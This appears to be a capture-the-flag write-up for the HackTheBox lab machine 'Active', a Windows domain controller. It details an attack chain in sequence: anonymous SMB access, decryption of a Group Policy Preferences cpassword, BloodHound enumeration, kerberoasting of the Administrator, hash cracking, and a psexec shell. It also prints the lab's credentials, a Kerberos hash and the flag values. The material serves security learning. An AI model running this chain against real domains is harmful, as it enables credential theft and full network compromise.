![[Pasted image 20210801104841.png]]

Starting with an nmap scan reveals a lot of ports open and that this is a windows box:
```
 % nmap -p- -sV --min-rate=1000 10.10.10.100 -v -Pn 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-01 02:12 AEST
NSE: Loaded 45 scripts for scanning.
Initiating Parallel DNS resolution of 1 host. at 02:12
Completed Parallel DNS resolution of 1 host. at 02:12, 0.00s elapsed
Initiating Connect Scan at 02:12
Scanning 10.10.10.100 [65535 ports]
Discovered open port 53/tcp on 10.10.10.100
Discovered open port 135/tcp on 10.10.10.100
Discovered open port 445/tcp on 10.10.10.100
Discovered open port 139/tcp on 10.10.10.100
Discovered open port 49152/tcp on 10.10.10.100
Discovered open port 3269/tcp on 10.10.10.100
Discovered open port 49153/tcp on 10.10.10.100
Discovered open port 389/tcp on 10.10.10.100
Discovered open port 3268/tcp on 10.10.10.100
Discovered open port 636/tcp on 10.10.10.100
Discovered open port 49154/tcp on 10.10.10.100
Discovered open port 49169/tcp on 10.10.10.100
Discovered open port 49155/tcp on 10.10.10.100
Discovered open port 49157/tcp on 10.10.10.100
Discovered open port 464/tcp on 10.10.10.100
Discovered open port 88/tcp on 10.10.10.100
Discovered open port 49171/tcp on 10.10.10.100
Discovered open port 9389/tcp on 10.10.10.100
Discovered open port 593/tcp on 10.10.10.100
Discovered open port 47001/tcp on 10.10.10.100
Discovered open port 49182/tcp on 10.10.10.100
Discovered open port 5722/tcp on 10.10.10.100
Discovered open port 49158/tcp on 10.10.10.100
Completed Connect Scan at 02:12, 19.30s elapsed (65535 total ports)
Initiating Service scan at 02:12
Scanning 23 services on 10.10.10.100
Completed Service scan at 02:13, 58.86s elapsed (23 services on 1 host)
NSE: Script scanning 10.10.10.100.
Initiating NSE at 02:13
Completed NSE at 02:13, 0.18s elapsed
Initiating NSE at 02:13
Completed NSE at 02:13, 0.08s elapsed
Nmap scan report for 10.10.10.100
Host is up (0.018s latency).
Not shown: 65512 closed ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-07-31 15:58:45Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49169/tcp open  msrpc         Microsoft Windows RPC
49171/tcp open  msrpc         Microsoft Windows RPC
49182/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.14 seconds

```

smb anonymous access is allowed:
```
% smbclient  -L \\\\$IP\\                                                          ~/shared/BloodHound.py
Enter WORKGROUP\lo's password:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        Replication     Disk
        SYSVOL          Disk      Logon server share
        Users           Disk
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.100 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

We can connect to the Replication share and in it we find a Groups.xml file:
```
[2] % smbclient \\\\$IP\\Replication
Enter WORKGROUP\lo's password:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 21 20:37:44 2018
  ..                                  D        0  Sat Jul 21 20:37:44 2018
  active.htb                          D        0  Sat Jul 21 20:37:44 2018

                10459647 blocks of size 4096. 5724814 blocks available
smb: \> recurse
smb: \> ls
  .                                   D        0  Sat Jul 21 20:37:44 2018
  ..                                  D        0  Sat Jul 21 20:37:44 2018
  active.htb                          D        0  Sat Jul 21 20:37:44 2018

\active.htb
  .                                   D        0  Sat Jul 21 20:37:44 2018
  ..                                  D        0  Sat Jul 21 20:37:44 2018
  DfsrPrivate                       DHS        0  Sat Jul 21 20:37:44 2018
  Policies                            D        0  Sat Jul 21 20:37:44 2018
  scripts                             D        0  Thu Jul 19 04:48:57 2018

\active.htb\DfsrPrivate
  .                                 DHS        0  Sat Jul 21 20:37:44 2018
  ..                                DHS        0  Sat Jul 21 20:37:44 2018
  ConflictAndDeleted                  D        0  Thu Jul 19 04:51:30 2018
  Deleted                             D        0  Thu Jul 19 04:51:30 2018
  Installing                          D        0  Thu Jul 19 04:51:30 2018

\active.htb\Policies
  .                                   D        0  Sat Jul 21 20:37:44 2018
  ..                                  D        0  Sat Jul 21 20:37:44 2018
  {31B2F340-016D-11D2-945F-00C04FB984F9}      D        0  Sat Jul 21 20:37:44 2018
  {6AC1786C-016F-11D2-945F-00C04fB984F9}      D        0  Sat Jul 21 20:37:44 2018

\active.htb\scripts
  .                                   D        0  Thu Jul 19 04:48:57 2018
  ..                                  D        0  Thu Jul 19 04:48:57 2018

\active.htb\DfsrPrivate\ConflictAndDeleted
  .                                   D        0  Thu Jul 19 04:51:30 2018
  ..                                  D        0  Thu Jul 19 04:51:30 2018

\active.htb\DfsrPrivate\Deleted
  .                                   D        0  Thu Jul 19 04:51:30 2018
  ..                                  D        0  Thu Jul 19 04:51:30 2018

\active.htb\DfsrPrivate\Installing
  .                                   D        0  Thu Jul 19 04:51:30 2018
  ..                                  D        0  Thu Jul 19 04:51:30 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}
  .                                   D        0  Sat Jul 21 20:37:44 2018
  ..                                  D        0  Sat Jul 21 20:37:44 2018
  GPT.INI                             A       23  Thu Jul 19 06:46:06 2018
  Group Policy                        D        0  Sat Jul 21 20:37:44 2018
  MACHINE                             D        0  Sat Jul 21 20:37:44 2018
  USER                                D        0  Thu Jul 19 04:49:12 2018

\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}
  .                                   D        0  Sat Jul 21 20:37:44 2018
  ..                                  D        0  Sat Jul 21 20:37:44 2018
  GPT.INI                             A       22  Thu Jul 19 04:49:12 2018
  MACHINE                             D        0  Sat Jul 21 20:37:44 2018
  USER                                D        0  Thu Jul 19 04:49:12 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy
  .                                   D        0  Sat Jul 21 20:37:44 2018
  ..                                  D        0  Sat Jul 21 20:37:44 2018
  GPE.INI                             A      119  Thu Jul 19 06:46:06 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE
  .                                   D        0  Sat Jul 21 20:37:44 2018
  ..                                  D        0  Sat Jul 21 20:37:44 2018
  Microsoft                           D        0  Sat Jul 21 20:37:44 2018
  Preferences                         D        0  Sat Jul 21 20:37:44 2018
  Registry.pol                        A     2788  Thu Jul 19 04:53:45 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\USER
  .                                   D        0  Thu Jul 19 04:49:12 2018
  ..                                  D        0  Thu Jul 19 04:49:12 2018

\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE
  .                                   D        0  Sat Jul 21 20:37:44 2018
  ..                                  D        0  Sat Jul 21 20:37:44 2018
  Microsoft                           D        0  Sat Jul 21 20:37:44 2018

\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\USER
  .                                   D        0  Thu Jul 19 04:49:12 2018
  ..                                  D        0  Thu Jul 19 04:49:12 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft
  .                                   D        0  Sat Jul 21 20:37:44 2018
  ..                                  D        0  Sat Jul 21 20:37:44 2018
  Windows NT                          D        0  Sat Jul 21 20:37:44 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences
  .                                   D        0  Sat Jul 21 20:37:44 2018
  ..                                  D        0  Sat Jul 21 20:37:44 2018
  Groups                              D        0  Sat Jul 21 20:37:44 2018

\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft
  .                                   D        0  Sat Jul 21 20:37:44 2018
  ..                                  D        0  Sat Jul 21 20:37:44 2018
  Windows NT                          D        0  Sat Jul 21 20:37:44 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT
  .                                   D        0  Sat Jul 21 20:37:44 2018
  ..                                  D        0  Sat Jul 21 20:37:44 2018
  SecEdit                             D        0  Sat Jul 21 20:37:44 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups
  .                                   D        0  Sat Jul 21 20:37:44 2018
  ..                                  D        0  Sat Jul 21 20:37:44 2018
  Groups.xml                          A      533  Thu Jul 19 06:46:06 2018

\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT
  .                                   D        0  Sat Jul 21 20:37:44 2018
  ..                                  D        0  Sat Jul 21 20:37:44 2018
  SecEdit                             D        0  Sat Jul 21 20:37:44 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit
  .                                   D        0  Sat Jul 21 20:37:44 2018
  ..                                  D        0  Sat Jul 21 20:37:44 2018
  GptTmpl.inf                         A     1098  Thu Jul 19 04:49:12 2018

\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit
  .                                   D        0  Sat Jul 21 20:37:44 2018
  ..                                  D        0  Sat Jul 21 20:37:44 2018
  GptTmpl.inf                         A     3722  Thu Jul 19 04:49:12 2018

                10459647 blocks of size 4096. 5724814 blocks available
smb: \> cd \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\>
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> ls
  .                                   D        0  Sat Jul 21 20:37:44 2018
  ..                                  D        0  Sat Jul 21 20:37:44 2018
  Groups.xml                          A      533  Thu Jul 19 06:46:06 2018

                10459647 blocks of size 4096. 5724814 blocks available
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> mget Groups.xml
Get file Groups.xml? yes
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as Groups.xml (8.4 KiloBytes/sec) (average 8.4 KiloBytes/sec)
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\>

```

This file appears to contain a password "cpassword" however it seems to be encrypted:
```
% cat Groups.xml                                                                                       /media/shared
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

After some google fu, I found that this is actually a Group policy preferences file and that the cpassword value contains an AES encrypted password? however it can be decrypted.

Found a python tool to decrypt the value (https://raw.githubusercontent.com/leonteale/pentestpackage/master/Gpprefdecrypt.py):
```
#!/usr/bin/python
#
# Gpprefdecrypt - Decrypt the password of local users added via Windows 2008 Group Policy Preferences.
#
# This tool decrypts the cpassword attribute value embedded in the Groups.xml file stored in the domain controller's Sysvol share.
#

import sys
from Crypto.Cipher import AES
from base64 import b64decode

if(len(sys.argv) != 2):
  print "Usage: gpprefdecrypt.py <cpassword>"
  sys.exit(0)

# Init the key
# From MSDN: http://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be%28v=PROT.13%29#endNote2
key = """
4e 99 06 e8  fc b6 6c c9  fa f4 93 10  62 0f fe e8
f4 96 e8 06  cc 05 79 90  20 9b 09 a4  33 b6 6c 1b
""".replace(" ","").replace("\n","").decode('hex')

# Add padding to the base64 string and decode it
cpassword = sys.argv[1]
cpassword += "=" * ((4 - len(sys.argv[1]) % 4) % 4)
password = b64decode(cpassword)

# Decrypt the password
o = AES.new(key, AES.MODE_CBC, "\x00" * 16).decrypt(password)

# Print it
print o[:-ord(o[-1])].decode('utf16')
```

Running the tools gives us the password:
```
% python Gpprefdecrypt.py "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
GPPstillStandingStrong2k18
```

And we now have credentials for the box:
```
active.htb\SVC_TGS
GPPstillStandingStrong2k18
```

We validate the credentials using `crackmapexec` and find that we can login to ldap:
```
% crackmapexec ldap 10.10.10.100 -u "SVC_TGS" -p "GPPstillStandingStrong2k18"
LDAP        10.10.10.100    389    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
LDAP        10.10.10.100    389    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18
```

We can use ldap to dump all domain objects so we can load them into Bloodhound:
```
% python bloodhound.py -u SVC_TGS  -p GPPstillStandingStrong2k18 -d active.htb -gc active.htb -ns $IP -c all
INFO: Found AD domain: active.htb
INFO: Connecting to LDAP server: dc.active.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.active.htb
INFO: Found 4 users
INFO: Found 40 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.active.htb
INFO: User ANONYMOUS LOGON is logged in on DC.active.htb from 10.10.14.23
WARNING: Failed to resolve SAM name DC$ in current forest
INFO: Done in 00M 03S
```

We load everything into Bloodhound and find that we can kerberoast the Administrator:
![[Pasted image 20210801103112.png]]

When trying to kerberoast the admin, we get an error with the clock skew. This usually happens if there are large time differences between the machine and the target:
```
% GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18  -request-user Administrator
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-19 05:06:40.351723  2021-01-22 03:07:03.723783



[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

To fix this we just need to update NTP to use the boxes' NTP:
*Note: I didnt bother checking if the NTP port was open because I've seen a few kerberoasting boxes and NTP is usually open. However, you should use nmap to verify if the NTP UDP port is open and match your time with that.*
```
#  This file is part of systemd.
#
#  systemd is free software; you can redistribute it and/or modify it
#  under the terms of the GNU Lesser General Public License as published by
#  the Free Software Foundation; either version 2.1 of the License, or
#  (at your option) any later version.
#
# Entries in this file show the compile time defaults.
# You can change settings by editing this file.
# Defaults can be restored by simply deleting this file.
#
# See timesyncd.conf(5) for details.

[Time]
NTP=active.htb
#FallbackNTP=0.debian.pool.ntp.org 1.debian.pool.ntp.org 2.debian.pool.ntp.org 3.debian.pool.ntp.org
RootDistanceMaxSec=1000
#PollIntervalMinSec=32
#PollIntervalMaxSec=2048
```

We try kerberoasting the admin again and this time we get a hash:
```
% GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18  -request-user Administrator
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-19 05:06:40.351723  2021-01-22 03:07:03.723783



$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$e0be3973615f51a45fc966e6661b980a$b20af82939507be9e963ad3648236cf28eef9d2058a51cf6b5f87ba2f80380a87ffa65a14892f4bf591d5d731918ca5a9d745f08561d03a99b69c2e8fc4f539722119bb4d1d8c7371e34c9acd98404a1b604adddcde43c1914d6da9d0b67dda891ceee2b53233c5d7e15f746e4169e3b07389f12c98003044c03fc52482fd570814b37c8dd18ff7ccb614ae4ac92b4ee9e72a941109e397e151695979078c98f449bc5e87b3b874625417abb42cdff8ed0b91ea287cc480c5c61281b0f3fe2b31fa212977a447df9aa93d176663665f1e56faaa8da80006806edb36e54b9f990a5d502400b508578f1c537a0a697bcbfb8fe46af0a5c9ef3fd05f17b65c46d2a085fd5b702b2e04cfbb56c5eed72b558654c4cf0fbb8c7facac7d7d7c11323337a2943972c677866e4e32ab7eaa45e4c994bbfb5ca2d51baa6b477edc3f1a38b87b5a494727a6e9ee6bcce686cd7a4d10da8c01910fdd66e239354418704917725dd2b4ab0328fb2e329d6921a74a5b33147d6d4beb60f2402dd947cfb4aacde65856ae10d10bced3b05243127582852708b962276ec3b4241368d99a323f4cd52dd56540577b110ce6b48cf01192ed9570e72fa8311d65a9a74809a17b257aaac2b22fac728071ab679b4663cdce38852d384ee50bb3eb62da8378a574e4db02b1b345f38ca8601c97d3495d5f7d1212adc7110817d404aee54fc4a3ae0804ae20ed7c10f16c5dd733a3fe39f9ce89fc4d4bb8feac162a115ac9c49ce5152ccaf6d1bee695b5589c4c799eaf87af2fe93c67bc9d22f444f061ee9360da3895c31b7139c36b3b93f6363d3c8d8d7700107572a4106f12e2fdf38450d2b942b27099e05cbb33235212766b4d42dea683995986f79cc9cc4ede7511ae627db3d4d40cd6e682d16a595df0027779d6bb8fb4fa263e9443ce22113428c762fdde6e4978dc14dc71bb0dd5beafd4987c661f0c054ff34855ee85fbd3ad1246a5ccffaecaad160e965354035efb9e2090250259c827f845084994d35c0dc10e7a3d5ae3832b2118434e242eaa2aa1b11367574e8bb0c4e763c0f7d8dc93f67ea9b52065539b8ba5ff0cd0a43447697f9c1f3b827d7bf9ecb99473c2c5fa34ac7c1ab3f84a15b95d4a1c6074cb9367f1516ba2056ad81a08d59f05148048c3c86f2fb999980abbc166289d42db7fdb1d8c4ec69db03c7e8c94048a4683066e8302c484c2838916058fb7bb4245937509dc4c841ebfd67edf0a80ce874a0
```

We can use `john` to crack this hash and retrieve the password:
```
% john asdf.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)
1g 0:00:00:05 DONE (2021-08-01 02:19) 0.1718g/s 1810Kp/s 1810Kc/s 1810KC/s Tiffani1432..Thurman16
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

We now have the admin user credentials:
```
Administrator
Ticketmaster1968
```

We can get a shell using `psexec` and retrieve both user and administrator flags:
```
% psexec.py active.htb/Administrator:Ticketmaster1968@$IP
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file XToCdMEL.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service buTV on 10.10.10.100.....
[*] Starting service buTV.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>cd C:\Users\SVC_TGS\Desktop

C:\Users\SVC_TGS\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 2AF3-72E4

 Directory of C:\Users\SVC_TGS\Desktop

21/07/2018  06:14 úú    <DIR>          .
21/07/2018  06:14 úú    <DIR>          ..
21/07/2018  06:06 úú                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)  23.448.723.456 bytes free

C:\Users\SVC_TGS\Desktop>type user.txt
86d67d8ba232bb6a254aa4d10159e983

C:\Users\SVC_TGS\Desktop>cd ../../Administrator/Desktop

C:\Users\Administrator\Desktop>type root.txt
b5fc76d1d6b91d77b2fbf2d54d0f708b
```
